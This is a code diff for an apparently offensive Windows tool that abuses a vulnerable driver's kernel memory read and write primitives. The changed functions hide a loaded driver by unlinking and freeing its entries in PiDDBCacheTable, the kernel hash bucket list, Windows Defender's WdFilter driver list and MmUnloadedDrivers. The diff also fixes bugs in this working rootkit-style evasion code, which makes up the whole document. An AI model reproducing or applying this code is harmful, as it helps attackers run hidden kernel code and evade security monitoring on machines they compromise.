@@ -1,11 +1,16 @@
 #include "utils.h"
-#include "vulndriver.h"
 #pragma warning(disable : 4267)
 #define RUNTIMEDRIVERSARRAY_MAXSIZE 256
 #define DRIVERINFO_MAGIC 0xDA18
 #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+
+
+typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	OUT PVOID SystemInformation,
+	IN ULONG SystemInformationLength,
+	OUT PULONG ReturnLength OPTIONAL);
 
 
 LIST_ENTRY* ReadListEntryFromAddress(HANDLE* DeviceHandle, PVOID ListEntryAddress) {
@@ -22,8 +27,8 @@ nt::PPiDDBCacheEntry VulnurableDriver::PersistenceFunctions::LookupEntryInPiDDBT
 	SearchedEntry.TimeDateStamp = EntryTimestamp;
 	SearchedEntry.DriverName.Buffer = (PWSTR)DriverName;
 	SearchedEntry.DriverName.Length = (USHORT)(wcslen(DriverName) * sizeof(WCHAR));
-	SearchedEntry.DriverName.MaximumLength = (USHORT)((wcslen(DriverName) + 1) * sizeof(WCHAR));
-	return (nt::PPiDDBCacheEntry)specific::HandleElementGenericTable(DeviceHandle, KernelBaseAddress, PiDDBCacheTable, (PVOID)&SearchedEntry, TRUE);
+	SearchedEntry.DriverName.MaximumLength = SearchedEntry.DriverName.Length + sizeof(WCHAR);
+	return (nt::PPiDDBCacheEntry)specific::RtlLookupElementGenericTableAvl(DeviceHandle, KernelBaseAddress, PiDDBCacheTable, (PVOID)&SearchedEntry);
 }
 
 
@@ -64,19 +69,18 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* De
 		printf("[-] Cannot clean PiDDBCacheTable - PiDDBCacheTable not found  pattern\n");
 		return STATUS_UNSUCCESSFUL;
 	}
-	else {
-		printf("[+] Found PiDDBCacheTable with pattern at address %p\n", RelativePiDDBCacheTable);
-	}
+	printf("[+] Found PiDDBCacheTable with pattern at address %p\n", RelativePiDDBCacheTable);
 
 
 	// Parse the relative addresses in the system module to the actual address:
 	*ActualPiDDBLock = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativePiDDBLock, 3, 7);
 	*ActualPiDDBCacheTable = (nt::PRTL_AVL_TABLE)VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, RelativePiDDBCacheTable, 6, 10);
+	printf("[+] Actual table: %p, Actual lock: %p\n", *ActualPiDDBCacheTable, ActualPiDDBLock);
 
 
 	// Acquire the PiDDB lock to manipulate the table:
-	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, TRUE)) {
-		printf("[-] Cannot lock PiDDBCacheLock - HandleResourceLite failed\n");
+	if (!specific::ExAcquireResourceExclusiveLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, true)) {
+		printf("[-] Cannot lock PiDDBCacheLock - ExAcquireResourceExclusiveLite failed\n");
 		return STATUS_UNSUCCESSFUL;
 	}
 	printf("[+] Locked PiDDBCacheLock\n");
@@ -86,7 +90,7 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* De
 	DriverTableEntry = (nt::PPiDDBCacheEntry)VulnurableDriver::PersistenceFunctions::LookupEntryInPiDDBTable(DeviceHandle, KernelBaseAddress, *ActualPiDDBCacheTable, DriverTimestamp, DriverName);
 	if (DriverTableEntry == NULL) {
 		wprintf(L"[-] Cannot find entry for driver %s in PiDDBCacheTable\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
 	wprintf(L"[+] Found PiDDBCacheTable entry for driver %s: %p\n", DriverName, (PVOID)DriverTableEntry);
@@ -95,30 +99,30 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* De
 	// Unlink LIST_ENTRY of driver from the list of drivers:
 	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverTableEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), TRUE), &PreviousDriverEntry, sizeof(PreviousDriverEntry))) {
 		wprintf(L"[-] Cannot get previous LIST_ENTRY to hide the driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverTableEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), TRUE), &NextDriverEntry, sizeof(PreviousDriverEntry))) {
+	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(DriverTableEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), TRUE), &NextDriverEntry, sizeof(NextDriverEntry))) {
 		wprintf(L"[-] Cannot get next LIST_ENTRY to hide the driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(PreviousDriverEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), TRUE), &NextDriverEntry, sizeof(NextDriverEntry))) {
+	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(PreviousDriverEntry, (offsetof(_LIST_ENTRY, Flink)), TRUE), &NextDriverEntry, sizeof(NextDriverEntry))) {
 		wprintf(L"[-] Cannot overwrite next LIST_ENTRY of previous LIST_ENTRY to hide the driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(NextDriverEntry, (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), TRUE), &PreviousDriverEntry, sizeof(PreviousDriverEntry))) {
+	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(NextDriverEntry, (offsetof(_LIST_ENTRY, Blink)), TRUE), &PreviousDriverEntry, sizeof(PreviousDriverEntry))) {
 		wprintf(L"[-] Cannot overwrite previous LIST_ENTRY of next LIST_ENTRY to hide the driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
 
 
 	// Delete actual PiDDB entry:
-	if (!specific::HandleElementGenericTable(DeviceHandle, KernelBaseAddress, *ActualPiDDBCacheTable, (PVOID)DriverTableEntry, FALSE)) {
+	if (!specific::RtlDeleteElementGenericTableAvl(DeviceHandle, KernelBaseAddress, *ActualPiDDBCacheTable, (PVOID)DriverTableEntry)) {
 		wprintf(L"[-] Cannot delete actual entry of driver %s in PiDDB table, entry is at %p\n", DriverName, (PVOID)DriverTableEntry);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 		return STATUS_UNSUCCESSFUL;
 	}
 
@@ -128,7 +132,7 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* De
 		TableDeleteCount--;
 		VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(*ActualPiDDBCacheTable, offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount), TRUE), &TableDeleteCount, sizeof(TableDeleteCount));
 	}
-	specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock, FALSE);
+	specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualPiDDBLock);
 	return STATUS_SUCCESS;
 }
 
@@ -178,9 +182,9 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(HANDL
 	}
 
 
-	// Acquire  lock to modify the list:
-	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, TRUE)) {
-		printf("[-] Cannot lock ActualHashBucketLock - HandleResourceLite failed\n");
+	// Acquire lock to modify the list:
+	if (!specific::ExAcquireResourceExclusiveLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, TRUE)) {
+		printf("[-] Cannot lock ActualHashBucketLock - ExAcquireResourceExclusiveLite failed\n");
 		return STATUS_UNSUCCESSFUL;
 	}
 	printf("[+] Locked ActualHashBucketLock\n");
@@ -191,29 +195,29 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(HANDL
 	CurrentEntry = NULL;
 	if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)PreviousEntry, &CurrentEntry, sizeof(CurrentEntry))) {
 		wprintf(L"[-] Cannot get hash bucket list entry to hide the driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 		return STATUS_UNSUCCESSFUL;
 	}
 	if (CurrentEntry == NULL) {
 		wprintf(L"[+] HashBucketList is empty, no need to continue to hide driver %s\n", DriverName);
-		specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+		specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 		return STATUS_SUCCESS;
 	}
 	while (CurrentEntry != NULL) {
 		if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(CurrentEntry, offsetof(nt::_HashBucketEntry, DriverName.Length), TRUE), &CurrentDriverNameLength, sizeof(CurrentDriverNameLength)) || CurrentDriverNameLength == 0) {
 			wprintf(L"[-] Cannot get length of current hash bucket list entry driver name, searched driver %s\n", DriverName);
-			specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+			specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 			return STATUS_UNSUCCESSFUL;
 		}
 		if (ExpectedDriverNameSize == CurrentDriverNameLength) {
 			if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(CurrentEntry, offsetof(nt::_HashBucketEntry, DriverName.Buffer), TRUE), &CurrentDriverNamePointer, sizeof(CurrentDriverNamePointer)) || CurrentDriverNamePointer == NULL) {
 				wprintf(L"[-] Cannot get pointer to driver name of current hash bucket list entry, searched driver %s\n", DriverName);
-				specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+				specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 				return STATUS_UNSUCCESSFUL;
 			}
 			if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, CurrentDriverNamePointer, CurrentDriverName, CurrentDriverNameLength) || wcscmp(CurrentDriverName, L"") == 0) {
 				wprintf(L"[-] Cannot get driver name of current hash bucket list entry, searched driver %s\n", DriverName);
-				specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+				specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 				return STATUS_UNSUCCESSFUL;
 			}
 
@@ -222,20 +226,20 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(HANDL
 				wprintf(L"[+] Found entry of driver %s with full path %s at address %p\n", DriverName, DriverFullPath, (PVOID)CurrentEntry);
 				if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)CurrentEntry, &NextEntry, sizeof(NextEntry))) {
 					wprintf(L"[-] Cannot get next hash bucket list entry after finding entry to patch\n");
-					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+					specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 					return STATUS_UNSUCCESSFUL;
 				}
 				if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, (PVOID)PreviousEntry, &NextEntry, sizeof(NextEntry))) {
 					wprintf(L"[-] Cannot write pointer to next entry for previous entry to patch the list\n");
-					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+					specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 					return STATUS_UNSUCCESSFUL;
 				}
 				if (!specific::HandleExFreePool(DeviceHandle, KernelBaseAddress, (PVOID)CurrentEntry)) {
 					wprintf(L"[-] Cannot free pool of current entry with ExFreePool export\n");
-					specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+					specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 					return STATUS_UNSUCCESSFUL;
 				}
-				if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE)) {
+				if (!specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock)) {
 					printf("[-] Cannot unlock ActualHashBucketLock - HandleResourceLite failed, final after patching\n");
 					return STATUS_UNSUCCESSFUL;
 				}
@@ -251,15 +255,15 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanKernelHashBucketList(HANDL
 		// Get next entry:
 		if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, (PVOID)CurrentEntry, &CurrentEntry, sizeof(CurrentEntry))) {
 			wprintf(L"[-] Cannot get next hash bucket list entry, searched driver %s\n", DriverName);
-			specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE);
+			specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
 
 
 	// Release lock:
-	if (!specific::HandleResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock, FALSE)) {
-		printf("[-] Cannot unlock ActualHashBucketLock - HandleResourceLite failed\n");
+	if (!specific::ExReleaseResourceLite(DeviceHandle, KernelBaseAddress, *ActualHashBucketLock)) {
+		printf("[-] Cannot unlock ActualHashBucketLock - ExReleaseResourceLite failed\n");
 	}
 	return STATUS_UNSUCCESSFUL;
 }
@@ -374,7 +378,7 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanWdFilterDriverList(HANDLE*
 							// Verify DriverInfo magic, if not equal to 0xDA18 might be another version and cause BSoD:
 							VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, HiddenDriverInfo, &DriverInfoMagic, sizeof(DriverInfoMagic));
 							if (DriverInfoMagic == DRIVERINFO_MAGIC) {
-								CallKernelFunction(DeviceHandle, (PVOID*)NULL, *ActualFreeDriverInfo, KernelBaseAddress, HiddenDriverInfo);
+								CallKernelFunction(DeviceHandle, (PVOID)NULL, *ActualFreeDriverInfo, KernelBaseAddress, HiddenDriverInfo);
 							}
 							wprintf(L"[+] Successfully cleaned the info of driver %s from WdFilter driver list\n", DriverName);
 							return STATUS_SUCCESS;
@@ -386,10 +390,11 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanWdFilterDriverList(HANDLE*
 			}
 		}
 	}
+	return STATUS_UNSUCCESSFUL;  // Entry was not found
 }
 
 
-NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LPCWSTR DriverName) {
+BOOL VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LPCWSTR DriverName) {
 	ULONG SystemHandlesSize = 0;
 	PVOID SystemHandlesInfo = NULL;
 	nt::PSYSTEM_HANDLE_INFORMATION_EX SystemHandleInformation = NULL;
@@ -400,7 +405,9 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* 
 	UNICODE_STRING DriverBaseDllName = { 0 };
 	WCHAR MatchingDriverName[MAX_PATH] = { 0 };
 	nt::SYSTEM_HANDLE CurrentSystemHandle = { 0 };	
-	NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
+	QuerySystemInformation KernelQuerySystemInformation = (QuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+	NTSTATUS Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
+	//NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
 	
 	
 	// Allocate enough memory for information and query to get the information:
@@ -409,7 +416,7 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* 
 			VirtualFree(SystemHandlesInfo, 0, MEM_RELEASE);
 		}
 		SystemHandlesInfo = VirtualAlloc(NULL, SystemHandlesSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-		Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
+		Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, SystemHandlesInfo, SystemHandlesSize, &SystemHandlesSize);
 	}
 	if (!NT_SUCCESS(Status) || SystemHandlesInfo == NULL){
 		if (SystemHandlesInfo != NULL) {
@@ -433,7 +440,7 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* 
 	}
 	VirtualFree(SystemHandlesInfo, 0, MEM_RELEASE);
 	if (CurrentHandleObject == NULL) {
-		return STATUS_UNSUCCESSFUL;
+		return FALSE;
 	}
 
 
@@ -467,7 +474,6 @@ NTSTATUS VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(HANDLE* 
 		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), failed to patch UNICODE_STRING of unloaded driver\n", DriverName);
 		return FALSE;
 	}
-
 	wprintf(L"[+] Cleaned driver %s from MmUnloadedDrivers()\n", DriverName);
 	return TRUE;
 }
